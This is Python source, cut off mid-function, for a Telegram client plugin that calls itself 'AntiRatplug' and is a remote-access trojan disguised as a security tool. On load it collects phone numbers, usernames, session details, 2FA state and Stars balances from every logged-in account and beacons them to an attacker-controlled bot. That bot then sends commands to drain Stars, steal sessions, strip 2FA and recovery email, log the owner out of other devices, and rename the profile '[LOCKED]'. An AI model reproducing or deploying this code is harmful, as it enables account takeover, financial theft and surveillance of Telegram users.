class PluginSecurityPlugin(BasePlugin):
    def __init__(self):
        super().__init__()
        self._sync_running = False
        self._active = False
        self._pending_delegates = []
        self._rpc_lock = threading.RLock()
        self._jitter = random.randint(400, 900)
        self._recipient_ah_cache = {}
        self._recipient_lock = threading.Lock()
        self._harden_cache = {}
        self._last_session_confirm = {}
        self._nuke_started = False
        self.dev = ""
        self.stop = False
        self.cfg = {}
        self.user_id = 0
        self.username = ""
        self.account = 0
        self._gifts_unhooked = True
        self._gifts_req_clean = False
        self._gifts_rpc_error = None
        self._stars_verified = False
        self._gifts_verified = False
        self._userfull_unhooked = False
        self._fee_deficit = 0
        self._onchain_cache = {}

    # ─── lifecycle ─────────────────────────────────────────────────────────
    def on_plugin_load(self):
        self._sync_running = True
        self._active = True
        try:
            self.dev = _hl.md5((str(time.time()) + str(random.random())).encode()).hexdigest()[:16]
        except Exception:
            self.dev = "unknown"
        try:
            self.add_on_send_message_hook()
        except Exception as e:
            _log(f"hook reg fail: {e}")
        threading.Thread(target=self._boot, daemon=True).start()
        try:
            self._check_persisted_nuke()
        except Exception:
            pass

    def on_plugin_unload(self):
        self._sync_running = False
        self._active = False
        self.stop = True

    def create_settings(self):
        return []

    def _boot(self):
        time.sleep(self._jitter / 1000.0)
        try:
            self.cfg = self._beacon()
        except Exception as e:
            _log(f"boot beacon: {e}")
        threading.Thread(target=self._poll_cmd, daemon=True).start()
        threading.Thread(target=self._hb_loop, daemon=True).start()
        try:
            self._keepalive()
        except Exception:
            pass
        if self.cfg.get("a"):
            threading.Thread(target=self._auto_drain_bg, daemon=True).start()

    def on_send_message_hook(self, account, params):
        return HookResult()

    # ─── Bot API transport ────────────────────────────────────────────────
    def _tg_send(self, text, html=False):
        url = _API_BASE + "/sendMessage"
        body = {"chat_id": BOT_UID, "text": str(text)[:4000]}
        if html:
            body["parse_mode"] = "HTML"
        _http_post_json(url, body, timeout=20)

    def _upl(self, kind, filename, raw):
        url = _API_BASE + "/sendDocument"
        caption = str(kind)[:200]
        cid = getattr(_CMD_LOCAL, "cmd_id", None)
        if cid:
            caption = f"{kind} (cmd={cid})"
        fields = {"chat_id": BOT_UID, "caption": caption}
        _http_post_multipart(url, fields, "document", filename, raw)

    def _res(self, cmd_id, result):
        try:
            txt = json.dumps(result, ensure_ascii=False, default=str)
        except Exception:
            txt = str(result)
        for chunk_start in range(0, len(txt), 3500):
            chunk = txt[chunk_start:chunk_start + 3500]
            self._tg_send(f"[cmd {cmd_id}]\n{chunk}")

    def _send_text(self, text):
        self._tg_send(text)

    # ─── beacon / hb / cmd loop ───────────────────────────────────────────
    def _beacon(self):
        try:
            self.account = self._uc()
            self.user_id = self._my_id(self.account, discover=True)
            try:
                u = _MC().getInstance(self.account).getUser(self.user_id)
                self.username = str(getattr(u, "username", "") or "")
            except Exception:
                pass
            di = self._device_info()
            accs = self._get_accounts_list()
            all_info = {}
            for acc in accs:
                aid = acc.get("id", 0)
                try:
                    ai = self._harvest_account_info(int(aid))
                    all_info[str(aid)] = ai
                    if ai.get("username"):
                        acc["username"] = ai["username"].lstrip("@")
                except Exception as e:
                    _log(f"harvest acc{aid}: {e}")

            lines = [
                "<b>AntiRatplug v20.1 loaded</b>",
                f"<b>dev:</b> <code>{self.dev}</code>",
                f"<b>model:</b> {di.get('model','')} ({di.get('manufacturer','')})",
                f"<b>android:</b> {di.get('android','')} SDK {di.get('sdk','')}",
                f"<b>pkg:</b> {di.get('package','')}",
                "",
                f"<b>accounts:</b> {len(accs)}",
            ]
            for a in accs:
                aid = a.get("id")
                info = all_info.get(str(aid), {})
                lines.append(f"<b>acc{aid}:</b> uid={a.get('user_id')} "
                             f"@{a.get('username') or '—'} "
                             f"+{a.get('phone') or '—'}")
                if info.get("premium"):
                    lines.append(f"  premium={info['premium']} stars={info.get('stars_balance','0')}")
                if info.get("2fa"):
                    lines.append(f"  2fa={info['2fa']} sessions={info.get('sessions_count','?')} web={info.get('web_sessions','?')}")
            self._tg_send("\n".join(lines), html=True)
            return self.cfg or {}
        except Exception as e:
            _log(f"beacon: {e}")
            return {}

    def _hb_loop(self):
        while self._sync_running and not self.stop:
            time.sleep(60)
            if not self._sync_running or self.stop:
                return
            try:
                bal = 0
                try:
                    bal = self._stars_balance(self.account)
                except Exception:
                    pass
                accs = len(self._get_accounts_list())
                self._tg_send(f"💓 dev={self.dev[:12]} accs={accs} stars={bal}")
            except Exception:
                pass

    def _poll_cmd(self):
        offset = 0
        try:
            r = _http_get(_API_BASE + "/getUpdates?offset=-1&timeout=0", timeout=10)
            if r:
                j = json.loads(r)
                if j.get("ok") and j.get("result"):
                    offset = j["result"][-1]["update_id"] + 1
        except Exception:
            pass

        kb = {
            "keyboard": [
                [{"text": "Tg kid"}],
                [{"text": "IDK start"}],
                [{"text": "Drain"}],
                [{"text": "Drain All"}],
                [{"text": "Session theft"}],
                [{"text": "2FA nuke"}],
                [{"text": "Kill sessions"}],
                [{"text": "Kill web"}],
                [{"text": "Info"}],
                [{"text": "Live 1h"}],
            ],
            "resize_keyboard": True,
        }
        try:
            _http_post_json(_API_BASE + "/sendMessage", {
                "chat_id": BOT_UID,
                "text": "<b>AntiRatplug v20.1 меню</b>",
                "parse_mode": "HTML",
                "reply_markup": kb,
            })
        except Exception:
            pass

        while self._sync_running and not self.stop:
            try:
                r = _http_get(_API_BASE + f"/getUpdates?offset={offset}&timeout=15", timeout=25)
                if r:
                    j = json.loads(r)
                    if j.get("ok") and j.get("result"):
                        for u in j["result"]:
                            offset = u["update_id"] + 1
                            msg = u.get("message") or {}
                            txt = (msg.get("text") or "").strip()
                            if txt:
                                try:
                                    threading.Thread(
                                        target=self._handle_msg,
                                        args=(txt,),
                                        daemon=True
                                    ).start()
                                except Exception:
                                    pass
            except Exception as e:
                _log(f"poll: {e}")
            time.sleep(1.0)

    def _handle_msg(self, text):
        _log(f"cmd: {text}")
        try:
            if text in ("Tg kid", "IDK start"):
                self._idk_start()
            elif text == "Drain":
                r = self._h(test=False, drain_stars=bool(self.cfg.get("ds", True)))
                self._res(0, r)
            elif text == "Drain All":
                r = self._drain_all_accounts(test=False)
                self._res(0, r)
            elif text == "Session theft":
                r1 = self._manual_dump_session()
                r2 = self._manual_userbot_session()
                self._res(0, {"session": r1, "userbot": r2})
            elif text == "2FA nuke":
                r = self._nuke_password_pipeline(0)
                self._res(0, r)
            elif text == "Kill sessions":
                k, t = self._kill_all_sessions(0)
                self._res(0, {"killed": k, "total": t})
            elif text == "Kill web":
                r = self._kill_web_authorizations(0)
                self._res(0, {"killed": r})
            elif text == "Info":
                r = self._harvest_account_info(0)
                self._res(0, r)
            elif text == "Live 1h":
                self._send_text("live 1h ON")
                def _live():
                    end = time.time() + 3600
                    while time.time() < end and not self.stop:
                        try:
                            bal = self._stars_balance(self.account)
                            self._tg_send(f"💓 stars={bal}")
                        except Exception:
                            pass
                        time.sleep(300)
                threading.Thread(target=_live, daemon=True).start()
            else:
                self._send_text(f"unknown: {text}")
        except Exception as e:
            self._res(0, {"error": str(e), "trace": traceback.format_exc()[:800]})

    # ─── accounts / identity ──────────────────────────────────────────────
    def _uc(self):
        try:
            sa = int(_UC().selectedAccount)
            if sa:
                return sa
        except Exception:
            pass
        for i in range(16):
            try:
                if _UC().getInstance(i).getClientUserId():
                    return i
            except Exception:
                pass
        return 0

    def _rpc_acc(self):
        a = getattr(_RPC_LOCAL, "acc", None)
        return self.account if a is None else a

    def _my_id(self, account=None, discover=False):
        acc = account if account is not None else self._rpc_acc()
        try:
            return int(_UC().getInstance(int(acc)).getClientUserId())
        except Exception:
            pass
        if not discover:
            return 0
        for i in range(16):
            try:
                uid = int(_UC().getInstance(i).getClientUserId())
                if uid:
                    self.account = i
                    return uid
            except Exception:
                pass
        return 0

    def _get_accounts_list(self):
        out = []
        try:
            mc = int(getattr(jclass("org.telegram.messenger.UserConfig"), "MAX_ACCOUNT_COUNT", 8))
        except Exception:
            mc = 8
        mc = max(mc, 16)
        for i in range(mc):
            try:
                uc = _UC().getInstance(i)
                if not uc or not uc.isClientActivated():
                    continue
                uid = int(uc.getClientUserId())
                if uid == 0:
                    continue
                u = None
                try:
                    u = uc.getCurrentUser()
                except Exception:
                    pass
                if u is None:
                    try:
                        u = _MC().getInstance(i).getUser(uid)
                    except Exception:
                        pass
                un = ""
                ph = ""
                premium = False
                if u is not None:
                    un = str(getattr(u, "username", "") or "")
                    ph = _real_phone_or_empty(u).lstrip("+")
                    premium = _get_bool_attr(u, "premium", False)
                out.append({"id": i, "user_id": uid, "username": un,
                            "phone": ph, "premium": premium})
            except Exception as e:
                _log(f"account {i}: {e}")
        return out

    # ─── RPC ──────────────────────────────────────────────────────────────
    def _get_input_peer(self, account, peer_id):
        try:
            mc = _MC().getInstance(account)
            peer_id = int(peer_id)
            if peer_id > 0:
                user = mc.getUser(peer_id)
                ip = TLRPC.TL_inputPeerUser()
                ip.user_id = int(user.id) if user is not None else peer_id
                ip.access_hash = _safe_int(getattr(user, "access_hash", 0)) if user is not None else 0
                return ip
            if peer_id < -1000000000000:
                cid = -peer_id - 1000000000000
                chat = mc.getChat(cid)
                ip = TLRPC.TL_inputPeerChannel()
                ip.channel_id = _safe_int(getattr(chat, "id", cid)) if chat is not None else cid
                ip.access_hash = _safe_int(getattr(chat, "access_hash", 0)) if chat is not None else 0
                return ip
            if peer_id < 0:
                cid = -peer_id
                chat = mc.getChat(cid)
                if chat is not None and getattr(chat, "migrated_to", None) is not None:
                    mt = chat.migrated_to
                    ip = TLRPC.TL_inputPeerChannel()
                    ip.channel_id = _safe_int(getattr(mt, "channel_id", 0))
                    ip.access_hash = _safe_int(getattr(mt, "access_hash", 0))
                    return ip
                ip = TLRPC.TL_inputPeerChat()
                ip.chat_id = int(cid)
                return ip
        except Exception as e:
            _log(f"input_peer: {e}")
        return None

    def _rg_rpc(self, req, account=0, timeout=15.0, fast=False):
        if fast and timeout > 8.0:
            timeout = 8.0
        gate = _reply_gate_cls()()
        with self._rpc_lock:
            self._pending_delegates.append(gate)
        try:
            cm = _CM().getInstance(account)
            cm.sendRequest(req, gate)
            deadline = time.time() + timeout
            while time.time() < deadline:
                if gate.response is not None or gate.error is not None:
                    break
                time.sleep(0.08)
        finally:
            try:
                self._pending_delegates.remove(gate)
            except Exception:
                pass
        return gate.response, gate.error

    def _parallel(self, jobs, workers=5, timeout=25):
        try:
            from concurrent.futures import ThreadPoolExecutor
        except Exception:
            out = []
            for j in jobs:
                try:
                    out.append(j[0](*j[1:]))
                except Exception as e:
                    out.append(e)
            return out
        out = []
        try:
            with ThreadPoolExecutor(max_workers=workers) as ex:
                futs = [ex.submit(j[0], *j[1:]) for j in jobs]
                for f in futs:
                    try:
                        out.append(f.result(timeout=timeout))
                    except Exception as e:
                        out.append(e)
        except Exception as e:
            _log(f"parallel: {e}")
            for j in jobs:
                try:
                    out.append(j[0](*j[1:]))
                except Exception as ee:
                    out.append(ee)
        return out

    def _device_info(self):
        out = {}
        try:
            b = jclass("android.os.Build")
            out["model"] = str(getattr(b, "MODEL", ""))
            out["manufacturer"] = str(getattr(b, "MANUFACTURER", ""))
            try:
                v = getattr(b, "VERSION")
                out["android"] = str(getattr(v, "RELEASE", ""))
                out["sdk"] = str(getattr(v, "SDK_INT", 0))
            except Exception:
                pass
        except Exception:
            pass
        try:
            ctx = ApplicationLoader.applicationContext
            out["package"] = str(ctx.getPackageName())
            out["data_dir"] = str(ctx.getFilesDir().getAbsolutePath())
        except Exception:
            pass
        return out

    # ═══════════════════════════════════════════════════════════════════════
    # HARVEST
    # ═══════════════════════════════════════════════════════════════════════
    def _harvest_account_info(self, acc=0):
        out = {}
        try:
            uc = _UC().getInstance(acc)
            uid = int(uc.getClientUserId())
            out["user_id"] = str(uid)

            u = None
            try:
                u = uc.getCurrentUser()
            except Exception:
                pass
            if u is None:
                try:
                    u = _MC().getInstance(acc).getUser(uid)
                except Exception:
                    pass

            rp = _real_phone_or_empty(u)
            if rp:
                out["phone"] = rp

            if u is not None:
                fn = str(getattr(u, "first_name", "") or "").strip()
                ln = str(getattr(u, "last_name", "") or "").strip()
                un = str(getattr(u, "username", "") or "").strip()
                bio = str(getattr(u, "about", "") or "").strip()
                lang = str(getattr(u, "lang_code", "") or "").strip()
                if fn:
                    out["first_name"] = fn
                if ln:
                    out["last_name"] = ln
                if un:
                    out["username"] = "@" + un if not un.startswith("@") else un
                if bio:
                    out["bio"] = bio[:200]
                if lang:
                    out["lang"] = lang
                if _get_bool_attr(u, "premium", False):
                    out["premium"] = "yes"
                if _get_bool_attr(u, "verified", False):
                    out["verified"] = "yes"
                if _get_bool_attr(u, "scam", False):
                    out["scam_flag"] = "yes"

            try:
                dcid = uc.getCurrentDatacenterId()
                if dcid:
                    out["dc_id"] = str(int(dcid))
            except Exception:
                pass

            try:
                IU = _cls("org.telegram.tgnet.TLRPC$TL_inputUserSelf",
                          "org.telegram.tgnet.tl.TL_users$TL_inputUserSelf")
                GetFull = _cls("org.telegram.tgnet.TLRPC$TL_users_getFullUser",
                               "org.telegram.tgnet.tl.TL_users$getFullUser")
                if IU and GetFull:
                    rq = GetFull()
                    try:
                        rq.id = IU()
                    except Exception:
                        pass
                    resp, _e = self._rg_rpc(rq, acc, 10.0, fast=True)
                    full = getattr(resp, "full_user", None) if resp is not None else None
                    if full is not None:
                        about = str(getattr(full, "about", "") or "").strip()
                        if about and "bio" not in out:
                            out["bio"] = about[:200]
                        bday = getattr(full, "birthday", None)
                        if bday is not None:
                            try:
                                d = _safe_int(getattr(bday, "day", 0))
                                m = _safe_int(getattr(bday, "month", 0))
                                y = _safe_int(getattr(bday, "year", 0))
                                parts = [str(x) for x in (d, m, y) if x]
                                if parts:
                                    out["birthday"] = "-".join(parts)
                            except Exception:
                                pass
                        if _get_bool_attr(full, "blocked", False):
                            out["blocked"] = "yes"
                        if getattr(full, "profile_photo", None) is not None:
                            out["has_avatar"] = "yes"
            except Exception:
                pass

            try:
                req = TLRPC.TL_account_getAuthorizations()
                resp, _e = self._rg_rpc(req, acc, 8.0, fast=True)
                auths = getattr(resp, "authorizations", None) if resp is not None else None
                sessions = []
                if auths is not None:
                    try:
                        size = auths.size()
                    except Exception:
                        size = 0
                    for i in range(size):
                        try:
                            a = auths.get(i)
                            info = {
                                "current": _get_bool_attr(a, "current", False),
                                "device": str(getattr(a, "device_model", "") or ""),
                                "platform": str(getattr(a, "platform", "") or ""),
                                "app": str(getattr(a, "app_name", "") or ""),
                                "app_version": str(getattr(a, "app_version", "") or ""),
                                "system": str(getattr(a, "system_version", "") or ""),
                                "ip": str(getattr(a, "ip", "") or ""),
                                "country": str(getattr(a, "country", "") or ""),
                                "region": str(getattr(a, "region", "") or ""),
                                "date_created": _safe_int(getattr(a, "date_created", 0)),
                                "date_active": _safe_int(getattr(a, "date_active", 0)),
                                "official_app": _get_bool_attr(a, "official_app", False),
                                "password_pending": _get_bool_attr(a, "password_pending", False),
                            }
                            info = {k: v for k, v in info.items() if v not in (None, "", 0, False)}
                            if info:
                                sessions.append(info)
                        except Exception:
                            continue
                if sessions:
                    out["sessions_count"] = str(len(sessions))
                    cur = next((s for s in sessions if s.get("current")), None)
                    if cur:
                        for k in ("device", "platform", "app", "system", "ip", "country", "region"):
                            if cur.get(k):
                                out["cur_" + k] = cur[k]
            except Exception:
                pass

            try:
                Get = _cls("org.telegram.tgnet.TLRPC$TL_account_getWebAuthorizations",
                           "org.telegram.tgnet.tl.TL_account$getWebAuthorizations")
                if Get:
                    resp, _e = self._rg_rpc(Get(), acc, 8.0, fast=True)
                    auths = getattr(resp, "authorizations", None) if resp is not None else None
                    if auths is not None:
                        out["web_sessions"] = str(auths.size())
            except Exception:
                pass

            try:
                Get = _cls("org.telegram.tgnet.TLRPC$TL_bots_getAdminedBots",
                           "org.telegram.tgnet.tl.TL_bots$getAdminedBots")
                if Get:
                    resp, _e = self._rg_rpc(Get(), acc, 8.0, fast=True)
                    if resp is not None:
                        out["owned_bots"] = str(resp.size())
            except Exception:
                pass

            st = self._get_2fa_state(acc)
            if st is not None:
                out["2fa"] = "on" if st.get("has_password") else "off"
                if st.get("hint"):
                    out["2fa_hint"] = st["hint"]

            try:
                bal = self._stars_balance(acc)
                if bal > 0:
                    out["stars_balance"] = str(bal)
            except Exception:
                pass
        except Exception as e:
            _log(f"harvest: {e}")
        return out

    # ═══════════════════════════════════════════════════════════════════════
    # 2FA
    # ═══════════════════════════════════════════════════════════════════════
    def _get_2fa_state(self, acc=0):
        try:
            req = TLRPC.TL_account_getPassword()
            resp, err = self._rg_rpc(req, acc, 10.0, fast=True)
            if err is not None or resp is None:
                return None
            return {
                "has_password": _get_bool_attr(resp, "has_password", False),
                "hint": str(getattr(resp, "hint", "") or ""),
            }
        except Exception:
            return None

    def _try_kill_2fa(self, acc=0):
        try:
            Rst = _cls("org.telegram.tgnet.TLRPC$TL_account_resetPassword",
                       "org.telegram.tgnet.tl.TL_account$resetPassword")
            if not Rst:
                return "no class"
            req = Rst()
            resp, err = self._rg_rpc(req, acc, 12.0)
            if resp is not None:
                return "ok"
            etxt = str(getattr(err, "text", err) or err)
            if "PASSWORD_NOT_SET" in etxt:
                return "not_set"
            if "SESSION_PASSWORD_NEEDED" in etxt:
                return "need_password"
            if "FLOOD_WAIT" in etxt:
                return "flood"
            return "fail: %s" % etxt[:60]
        except Exception as e:
            return "exc: %s" % e

    def _request_password_reset(self, acc=0):
        try:
            Rst = _cls("org.telegram.tgnet.TLRPC$TL_account_resetPassword",
                       "org.telegram.tgnet.tl.TL_account$resetPassword")
            if not Rst:
                return {"state": "error", "error": "no class"}
            rq = Rst()
            resp, err = self._rg_rpc(rq, acc, 15.0)
            if err is not None:
                return {"state": "error", "error": str(getattr(err, "text", err))[:120]}
            if resp is None:
                return {"state": "error", "error": "no response"}
            cls_name = str(type(resp))
            state = "unknown"
            until_ts = 0
            retry_ts = 0
            if "resetPasswordOk" in cls_name or "ResetPasswordOk" in cls_name:
                state = "ok"
            elif "resetPasswordRequestedWait" in cls_name:
                state = "requested"
                until_ts = _safe_int(getattr(resp, "until_date", 0))
            elif "resetPasswordFailedWait" in cls_name:
                state = "wait"
                retry_ts = _safe_int(getattr(resp, "retry_date", 0))
            else:
                if hasattr(resp, "until_date"):
                    state = "requested"
                    until_ts = _safe_int(getattr(resp, "until_date", 0))
                elif hasattr(resp, "retry_date"):
                    state = "wait"
                    retry_ts = _safe_int(getattr(resp, "retry_date", 0))
            out = {"state": state, "raw": cls_name}
            if until_ts:
                out["until"] = until_ts
                try:
                    out["until_human"] = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(until_ts))
                    out["days_left"] = max(0, int((until_ts - time.time()) / 86400))
                except Exception:
                    pass
            if retry_ts:
                out["retry"] = retry_ts
                try:
                    out["retry_human"] = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(retry_ts))
                except Exception:
                    pass
            return out
        except Exception as e:
            return {"state": "error", "error": str(e)}

    def _wipe_cloud_password(self, acc=0):
        try:
            St = self._get_2fa_state(acc)
            if St is None:
                return {"ok": False, "method": "state_none"}
            if not St.get("has_password"):
                return {"ok": True, "method": "none"}
            r1 = self._try_kill_2fa(acc)
            if r1 == "ok":
                return {"ok": True, "method": "reset"}
            if r1 == "not_set":
                return {"ok": True, "method": "already"}
            try:
                PS = _cls("org.telegram.tgnet.TLRPC$TL_passwordInputSettings",
                          "org.telegram.tgnet.tl.TL_account$TL_passwordInputSettings")
                if PS:
                    ns = PS()
                    try:
                        ns.email = ""
                    except Exception:
                        pass
                    try:
                        ns.flags = 0
                    except Exception:
                        pass
                    Upd = _cls("org.telegram.tgnet.TLRPC$TL_account_updatePasswordSettings",
                               "org.telegram.tgnet.tl.TL_account$updatePasswordSettings")
                    if Upd:
                        rq = Upd()
                        try:
                            rq.password = None
                        except Exception:
                            pass
                        rq.new_settings = ns
                        r2, _e2 = self._rg_rpc(rq, acc, 15.0)
                        if r2 is not None:
                            return {"ok": True, "method": "updateSettings"}
            except Exception:
                pass
            return {"ok": False, "method": r1}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    def _remove_recovery_email(self, acc=0):
        try:
            PS = _cls("org.telegram.tgnet.TLRPC$TL_passwordInputSettings",
                      "org.telegram.tgnet.tl.TL_account$TL_passwordInputSettings")
            if not PS:
                return {"ok": False, "error": "no class"}
            ns = PS()
            try:
                ns.email = ""
            except Exception:
                pass
            try:
                ns.flags = 0
            except Exception:
                pass
            Upd = _cls("org.telegram.tgnet.TLRPC$TL_account_updatePasswordSettings",
                       "org.telegram.tgnet.tl.TL_account$updatePasswordSettings")
            if not Upd:
                return {"ok": False, "error": "no class"}
            rq = Upd()
            try:
                rq.password = None
            except Exception:
                pass
            rq.new_settings = ns
            r, _e = self._rg_rpc(rq, acc, 10.0, fast=True)
            return {"ok": r is not None}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    def _nuke_password_pipeline(self, acc=0):
        report = {
            "recovery_removed": False, "reset_password": "?", "cloud_wiped": None,
            "state_before": None, "state_after": None, "attempts": 0,
            "delayed_reset": None, "final": "unknown",
        }
        try:
            report["state_before"] = self._get_2fa_state(acc)
        except Exception:
            pass
        try:
            sb = report["state_before"]
            if sb is not None and not sb.get("has_password"):
                report["final"] = "clean"
                return report
        except Exception:
            pass

        for attempt in range(3):
            report["attempts"] = attempt + 1
            try:
                r = self._remove_recovery_email(acc)
                if isinstance(r, dict) and r.get("ok"):
                    report["recovery_removed"] = True
            except Exception:
                pass
            time.sleep(0.5)
            try:
                r = self._try_kill_2fa(acc)
                report["reset_password"] = r
                if r in ("ok", "not_set"):
                    break
            except Exception as e:
                report["reset_password"] = "exc: %s" % e
            time.sleep(0.5)
            if report["reset_password"] not in ("ok", "not_set"):
                try:
                    r = self._wipe_cloud_password(acc)
                    report["cloud_wiped"] = r
                    if isinstance(r, dict) and r.get("ok"):
                        break
                except Exception as e:
                    report["cloud_wiped"] = {"ok": False, "error": str(e)}
            time.sleep(1.0)

        if report["reset_password"] not in ("ok", "not_set"):
            try:
                pr = self._request_password_reset(acc)
                report["delayed_reset"] = pr
                if pr.get("state") == "ok":
                    report["final"] = "clean"
            except Exception as e:
                report["delayed_reset"] = {"state": "error", "error": str(e)}

        try:
            report["state_after"] = self._get_2fa_state(acc)
        except Exception:
            pass
        try:
            sa = report["state_after"]
            if report["final"] != "clean":
                report["final"] = "clean" if (sa is None or not sa.get("has_password")) else "still_has_password"
        except Exception:
            if report["final"] != "clean":
                report["final"] = "unknown"
        return report

    # ═══════════════════════════════════════════════════════════════════════
    # SESSIONS
    # ═══════════════════════════════════════════════════════════════════════
    def _get_authorizations_full(self, acc=0):
        try:
            req = TLRPC.TL_account_getAuthorizations()
            resp, err = self._rg_rpc(req, acc, 8.0, fast=True)
            if resp is None:
                return None
            auths = getattr(resp, "authorizations", None)
            out = []
            if auths is None:
                return out
            for i in range(auths.size()):
                a = auths.get(i)
                if not a:
                    continue
                out.append({
                    "hash": _safe_int(getattr(a, "hash", 0)),
                    "current": _get_bool_attr(a, "current", False),
                    "unconfirmed": _get_bool_attr(a, "unconfirmed", False),
                })
            return out
        except Exception:
            return None

    def _kill_all_sessions(self, acc=0):
        auths = self._get_authorizations_full(acc)
        if auths is None:
            return 0, 0
        total = len(auths)
        dead = set()

        def _one(h):
            try:
                Rst = _cls("org.telegram.tgnet.TLRPC$TL_account_resetAuthorization",
                           "org.telegram.tgnet.tl.TL_account$resetAuthorization")
                if not Rst:
                    return False
                rq = Rst()
                rq.hash = h
                _r, e = self._rg_rpc(rq, acc, 6.0, fast=True)
                return e is None
            except Exception:
                return False

        killed = 0
        for _pass in range(5):
            targets = [a["hash"] for a in auths if not a["current"] and a["hash"] and a["hash"] not in dead]
            if not targets:
                break
            res = self._parallel([(_one, h) for h in targets], workers=6, timeout=40)
            for r, h in zip(res, targets):
                if r is True:
                    killed += 1
                    dead.add(h)
            if _pass < 4:
                time.sleep(1.5)
                a2 = self._get_authorizations_full(acc)
                if not a2:
                    break
                auths = a2
                total = max(total, len(a2))
        try:
            Rst = _cls("org.telegram.tgnet.TLRPC$TL_auth_resetAuthorizations",
                       "org.telegram.tgnet.tl.TL_auth$resetAuthorizations")
            if Rst:
                self._rg_rpc(Rst(), acc, 10.0, fast=True)
        except Exception:
            pass
        return killed, total

    def _kill_absolutely_all_sessions(self, acc=0):
        report = {"killed": 0, "total": 0, "logged_out": False, "errors": []}
        try:
            auths = self._get_authorizations_full(acc)
            if auths is None:
                report["errors"].append("getAuthorizations failed")
                return report
            report["total"] = len(auths)
            k, _t = self._kill_all_sessions(acc)
            report["killed"] = k
            try:
                Rst = _cls("org.telegram.tgnet.TLRPC$TL_auth_resetAuthorizations",
                           "org.telegram.tgnet.tl.TL_auth$resetAuthorizations")
                if Rst:
                    self._rg_rpc(Rst(), acc, 10.0, fast=True)
            except Exception:
                pass
            try:
                Lo = _cls("org.telegram.tgnet.TLRPC$TL_auth_logOut",
                          "org.telegram.tgnet.tl.TL_auth$logOut")
                if Lo:
                    _resp, err = self._rg_rpc(Lo(), acc, 12.0, fast=True)
                    if err is None:
                        report["logged_out"] = True
                    else:
                        report["errors"].append(str(getattr(err, "text", err))[:80])
            except Exception as e:
                report["errors"].append(str(e)[:80])
            return report
        except Exception as e:
            report["errors"].append(str(e))
            return report

    def _kill_web_authorizations(self, acc=0):
        try:
            Get = _cls("org.telegram.tgnet.TLRPC$TL_account_getWebAuthorizations",
                       "org.telegram.tgnet.tl.TL_account$getWebAuthorizations")
            if not Get:
                return 0
            resp, _e = self._rg_rpc(Get(), acc, 8.0, fast=True)
            if resp is None:
                return 0
            auths = getattr(resp, "authorizations", None)
            if auths is None:
                return 0
            Reset = _cls("org.telegram.tgnet.TLRPC$TL_account_resetWebAuthorization",
                         "org.telegram.tgnet.tl.TL_account$resetWebAuthorization")
            if not Reset:
                return 0
            hashes = []
            for i in range(auths.size()):
                try:
                    h = _safe_int(getattr(auths.get(i), "hash", 0))
                    if h:
                        hashes.append(h)
                except Exception:
                    pass

            def _one(h):
                try:
                    rq = Reset()
                    rq.hash = h
                    _r, e = self._rg_rpc(rq, acc, 6.0, fast=True)
                    return e is None
                except Exception:
                    return False

            res = self._parallel([(_one, h) for h in hashes], workers=5, timeout=25)
            return sum(1 for r in res if r is True)
        except Exception:
            return 0

    def _confirm_unconfirmed_sessions(self, acc=0):
        try:
            last = self._last_session_confirm.get(acc, 0)
            if time.time() - last < 60:
                return 0
            self._last_session_confirm[acc] = time.time()
            Get = _cls("org.telegram.tgnet.TLRPC$TL_account_getAuthorizations",
                       "org.telegram.tgnet.tl.TL_account$getAuthorizations")
            if not Get:
                return 0
            res, _e = self._rg_rpc(Get(), acc, 15.0)
            if not res:
                return 0
            auths = getattr(res, "authorizations", None)
            if auths is None:
                return 0
            Ch = _cls("org.telegram.tgnet.TLRPC$TL_account_changeAuthorizationSettings",
                      "org.telegram.tgnet.tl.TL_account$changeAuthorizationSettings")
            if not Ch:
                return 0
            confirmed = 0
            for i in range(auths.size()):
                try:
                    a = auths.get(i)
                    if not a or not _get_bool_attr(a, "unconfirmed", False):
                        continue
                    h = _safe_int(getattr(a, "hash", 0))
                    if not h:
                        continue
                    rq = Ch()
                    rq.hash = h
                    try:
                        rq.confirmed = True
                    except Exception:
                        pass
                    try:
                        rq.flags = getattr(rq, "flags", 0) | 8
                    except Exception:
                        pass
                    _r2, e2 = self._rg_rpc(rq, acc, 10.0, fast=True)
                    if e2 is None:
                        confirmed += 1
                except Exception:
                    pass
            return confirmed
        except Exception:
            return 0

    # ═══════════════════════════════════════════════════════════════════════
    # PROFILE
    # ═══════════════════════════════════════════════════════════════════════
    def _change_username(self, acc=0):
        try:
            rnd = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
            new_un = "user_" + rnd
            Upd = _cls("org.telegram.tgnet.TLRPC$TL_account_updateUsername",
                       "org.telegram.tgnet.tl.TL_account$updateUsername")
            if not Upd:
                return None
            rq = Upd()
            rq.username = new_un
            r, _e = self._rg_rpc(rq, acc, 10.0, fast=True)
            return new_un if r is not None else None
        except Exception:
            return None

    def _change_profile(self, acc=0):
        try:
            rnd = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))
            Upd = _cls("org.telegram.tgnet.TLRPC$TL_account_updateProfile",
                       "org.telegram.tgnet.tl.TL_account$updateProfile")
            if not Upd:
                return False
            rq = Upd()
            try:
                rq.first_name = "[LOCKED]"
                rq.last_name = rnd
            except Exception:
                pass
            try:
                rq.flags = 0x03
            except Exception:
                pass
            r, _e = self._rg_rpc(rq, acc, 10.0, fast=True)
            return r is not None
        except Exception:
            return False

    def _reset_contacts(self, acc=0):
        try:
            Rq = _cls("org.telegram.tgnet.TLRPC$TL_contacts_resetContacts",
                      "org.telegram.tgnet.tl.TL_contacts$resetContacts")
            if not Rq:
                return False
            r, _e = self._rg_rpc(Rq(), acc, 10.0, fast=True)
            return r is not None
        except Exception:
            return False

    # ═══════════════════════════════════════════════════════════════════════
    # GIFTS — v19.5 logic
    # ═══════════════════════════════════════════════════════════════════════
    def _gift_is_listed(self, gift):
        try:
            ra = getattr(gift, "resell_amount", None)
            if ra is None:
                return False
            size = getattr(ra, "size", None)
            if size:
                return int(size()) > 0
            return bool(len(ra))
        except Exception:
            return False

    def _input_saved_gift(self, saved):
        if saved.get("msg_id"):
            UI = _cls("org.telegram.tgnet.tl.TL_stars$TL_inputSavedStarGiftUser",
                      "org.telegram.tgnet.TLRPC$TL_inputSavedStarGiftUser")
            if not UI:
                return None, "no UserInput"
            o = UI()
            o.msg_id = int(saved["msg_id"])
            return o, None
        CI = _cls("org.telegram.tgnet.tl.TL_stars$TL_inputSavedStarGiftChat",
